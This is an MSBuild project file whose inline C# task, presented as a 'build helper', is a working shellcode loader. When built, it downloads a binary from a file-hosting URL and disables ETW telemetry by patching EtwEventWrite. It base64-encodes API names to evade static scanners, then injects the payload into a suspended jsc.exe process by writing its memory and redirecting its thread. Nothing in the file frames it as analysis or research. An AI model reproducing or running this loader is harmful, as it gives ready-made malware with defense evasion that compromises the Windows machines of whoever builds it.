<?xml version="1.0" encoding="utf-8"?>
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="RunTask" ToolsVersion="4.0">

  <PropertyGroup>
    <PayloadUrl Condition="'$(PayloadUrl)' == ''">https://files.catbox.moe/nfasiv.bin</PayloadUrl>
  </PropertyGroup>

  <UsingTask
    TaskName="StageTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup>
      <PayloadUrl Required="true" />
    </ParameterGroup>
    <Task>
      <Reference Include="System" />
      <Using Namespace="System" />
      <Using Namespace="System.IO" />
      <Using Namespace="System.Net" />
      <Using Namespace="System.Linq" />
      <Using Namespace="System.Runtime.InteropServices" />
      <Using Namespace="System.Text" />
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class StageTask : Task
{
    [Required]
    public string PayloadUrl { get; set; }

    // Only bare minimum P/Invoke; everything else resolved dynamically
    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.LPStr)] string lpLibFileName);
    [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, [MarshalAs(UnmanagedType.LPStr)] string lpProcName);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    // Delegates for dynamic resolution
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool D_CreateProcessA(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate IntPtr D_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool D_WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool D_GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool D_SetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool D_Wow64GetThreadContext(IntPtr hThread, ref WOW64_CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool D_Wow64SetThreadContext(IntPtr hThread, ref WOW64_CONTEXT ctx);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint D_ResumeThread(IntPtr hThread);

    const uint CREATE_SUSPENDED = 0x00000004;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READWRITE = 0x04;
    const uint CONTEXT_ALL = 0x0010001F;

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct FLOATING_SAVE_AREA
    {
        public uint ControlWord;
        public uint StatusWord;
        public uint TagWord;
        public uint ErrorOffset;
        public uint ErrorSelector;
        public uint DataOffset;
        public uint DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)] public byte[] RegisterArea;
        public uint Cr0NpxState;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public FLOATING_SAVE_AREA FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] public byte[] ExtendedRegisters;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WOW64_CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public FLOATING_SAVE_AREA FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] public byte[] ExtendedRegisters;
    }

    // Simple base64 helper to hide strings from static scanners
    private static string B(string input)
    {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
    }

    public override bool Execute()
    {
        try
        {
            Log.LogMessage(MessageImportance.High, "[STAGE] Initializing build helper...");
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Host architecture: {0}", Environment.Is64BitProcess ? "x64" : "x86"));

            // Resolve kernel32 exports
            IntPtr k32 = LoadLibraryA(B("a2VybmVsMzIuZGxs")); // kernel32.dll
            if (k32 == IntPtr.Zero)
            {
                Log.LogError("[STAGE] Failed to load core library");
                return false;
            }

            D_CreateProcessA createProcess = (D_CreateProcessA)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("Q3JlYXRlUHJvY2Vzc0E=")), typeof(D_CreateProcessA)); // CreateProcessA
            D_VirtualAllocEx virtualAllocEx = (D_VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("VmlydHVhbEFsbG9jRXg=")), typeof(D_VirtualAllocEx)); // VirtualAllocEx
            D_WriteProcessMemory writeProcessMemory = (D_WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("V3JpdGVQcm9jZXNzTWVtb3J5")), typeof(D_WriteProcessMemory)); // WriteProcessMemory
            D_GetThreadContext getThreadContext = (D_GetThreadContext)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("R2V0VGhyZWFkQ29udGV4dA==")), typeof(D_GetThreadContext)); // GetThreadContext
            D_SetThreadContext setThreadContext = (D_SetThreadContext)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("U2V0VGhyZWFkQ29udGV4dA==")), typeof(D_SetThreadContext)); // SetThreadContext
            D_Wow64GetThreadContext wow64GetThreadContext = (D_Wow64GetThreadContext)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("V293NjRHZXRUaHJlYWRDb250ZXh0")), typeof(D_Wow64GetThreadContext)); // Wow64GetThreadContext
            D_Wow64SetThreadContext wow64SetThreadContext = (D_Wow64SetThreadContext)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("V293NjRTZXRUaHJlYWRDb250ZXh0")), typeof(D_Wow64SetThreadContext)); // Wow64SetThreadContext
            D_ResumeThread resumeThread = (D_ResumeThread)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(k32, B("UmVzdW1lVGhyZWFk")), typeof(D_ResumeThread)); // ResumeThread

            // Telemetry patch
            PatchTelemetry();

            // Fetch payload
            byte[] buffer = FetchData(PayloadUrl);
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Payload size: {0} bytes", buffer.Length));
            if (buffer.Length == 0)
            {
                Log.LogError("[STAGE] Empty payload");
                return false;
            }

            // Locate x86 host
            string hostPath = LocateHost();
            if (string.IsNullOrEmpty(hostPath))
            {
                Log.LogError("[STAGE] Host executable not found");
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Selected host: {0}", hostPath));

            // Spawn suspended
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi;
            bool ok = createProcess(hostPath, " /nologo", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (!ok)
            {
                Log.LogError(string.Format("[STAGE] Process creation failed: {0}", Marshal.GetLastWin32Error()));
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Host started PID={0} TID={1}", pi.dwProcessId, pi.dwThreadId));

            // Allocate in target
            IntPtr remoteMem = virtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buffer.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero)
            {
                Log.LogError(string.Format("[STAGE] Remote allocation failed: {0}", Marshal.GetLastWin32Error()));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Remote buffer at 0x{0:X8}", remoteMem.ToInt64()));

            // Write payload
            int written;
            ok = writeProcessMemory(pi.hProcess, remoteMem, buffer, (uint)buffer.Length, out written);
            if (!ok)
            {
                Log.LogError(string.Format("[STAGE] Remote write failed: {0}", Marshal.GetLastWin32Error()));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Transferred {0} bytes", written));

            // Redirect execution
            uint targetEip = (uint)remoteMem.ToInt64();
            if (Environment.Is64BitProcess)
            {
                ApplyWow64Redirect(pi.hThread, wow64GetThreadContext, wow64SetThreadContext, targetEip);
            }
            else
            {
                ApplyX86Redirect(pi.hThread, getThreadContext, setThreadContext, targetEip);
            }

            // Resume
            uint sc = resumeThread(pi.hThread);
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Resumed host (count={0})", sc));

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Complete. Entry=0x{0:X8}", targetEip));
            return true;
        }
        catch (Exception ex)
        {
            Log.LogError(string.Format("[STAGE] Failure: {0}", ex.Message));
            return false;
        }
    }

    private void PatchTelemetry()
    {
        try
        {
            IntPtr ntdll = LoadLibraryA(B("bnRkbGwuZGxs")); // ntdll.dll
            if (ntdll == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(ntdll, B("RXR3RXZlbnRXcml0ZQ==")); // EtwEventWrite
            if (addr == IntPtr.Zero) return;

            uint oldProtect;
            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xC3, 0x90, 0x90, 0x90, 0x90 }
                : new byte[] { 0xC2, 0x14, 0x00, 0x90, 0x90 };

            if (!VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect)) return;
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Telemetry handler patched at 0x{0:X8}", addr.ToInt64()));
        }
        catch (Exception ex)
        {
            Log.LogWarning(string.Format("[STAGE] Telemetry patch skipped: {0}", ex.Message));
        }
    }

    private byte[] FetchData(string url)
    {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
        using (WebClient wc = new WebClient())
        {
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win32; x32) AppleWebKit/537.36");
            byte[] data = wc.DownloadData(url);
            Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Downloaded {0} bytes", data.Length));
            return data;
        }
    }

    private string LocateHost()
    {
        string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string[] paths = new[]
        {
            Path.Combine(windir, B("TWljcm9zb2Z0Lk5FVA=="), B("RnJhbWV3b3Jr"), B("djQuMC4zMDMxOQ=="), B("anNjLmV4ZQ==")),
            Path.Combine(windir, B("TWljcm9zb2Z0Lk5FVA=="), B("RnJhbWV3b3Jr"), B("djIuMC41MDcyNw=="), B("anNjLmV4ZQ==")),
        };
        foreach (string p in paths)
        {
            if (File.Exists(p))
            {
                Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Located host candidate: {0}", p));
                return p;
            }
        }
        return null;
    }

    private void ApplyX86Redirect(IntPtr hThread, D_GetThreadContext getCtx, D_SetThreadContext setCtx, uint eip)
    {
        CONTEXT ctx = new CONTEXT();
        ctx.ContextFlags = CONTEXT_ALL;
        if (!getCtx(hThread, ref ctx))
        {
            Log.LogError(string.Format("[STAGE] Context read failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        ctx.Eip = eip;
        if (!setCtx(hThread, ref ctx))
        {
            Log.LogError(string.Format("[STAGE] Context write failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        Log.LogMessage(MessageImportance.High, string.Format("[STAGE] x86 redirect set EIP=0x{0:X8}", eip));
    }

    private void ApplyWow64Redirect(IntPtr hThread, D_Wow64GetThreadContext getCtx, D_Wow64SetThreadContext setCtx, uint eip)
    {
        WOW64_CONTEXT ctx = new WOW64_CONTEXT();
        ctx.ContextFlags = CONTEXT_ALL;
        if (!getCtx(hThread, ref ctx))
        {
            Log.LogError(string.Format("[STAGE] Wow64 context read failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        ctx.Eip = eip;
        if (!setCtx(hThread, ref ctx))
        {
            Log.LogError(string.Format("[STAGE] Wow64 context write failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        Log.LogMessage(MessageImportance.High, string.Format("[STAGE] Wow64 redirect set EIP=0x{0:X8}", eip));
    }
}
]]>
      </Code>
    </Task>
  </UsingTask>

  <Target Name="RunTask">
    <StageTask PayloadUrl="$(PayloadUrl)" />
  </Target>

</Project>